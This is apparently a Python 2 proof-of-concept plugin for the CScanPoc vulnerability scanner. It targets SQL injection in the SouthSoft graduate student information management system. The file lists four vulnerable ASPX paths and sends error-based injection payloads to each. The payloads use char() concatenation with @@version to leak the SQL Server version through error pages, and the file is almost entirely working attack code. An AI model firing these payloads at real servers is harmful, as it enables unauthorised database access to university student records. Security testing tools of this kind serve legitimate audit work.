# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'SouthSoft_0007' # 平台漏洞编号，留空
    name = '南软研究生信息管理系统SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-04'  # 漏洞公布时间
    desc = '''
        南软研究生信息管理系统SQL注入漏洞：
        /Gmis/xw/EditdbxxInfo_bs.aspx?xh=1
        /Gmis/xw/dbtljgxg.aspx?id=1
        /Gmis/Byyxwgl/dbwyhwh.aspx?id=1
        /Gmis/xw/xwsb_xlssEdit.aspx?xh=1
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'SouthSoft'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f237d6e8-5b8a-4d2e-a1a8-84223b180f1a'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps=[
                '/Gmis/xw/EditdbxxInfo_bs.aspx?xh=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                '/Gmis/xw/dbtljgxg.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                '/Gmis/Byyxwgl/dbwyhwh.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                '/Gmis/xw/xwsb_xlssEdit.aspx?xh=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                ]
            for p in ps:
                url=arg+p
                code,head,res,errcode,_=hh.http(url) 
                if code==500 and "GAOJIMicrosoft" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()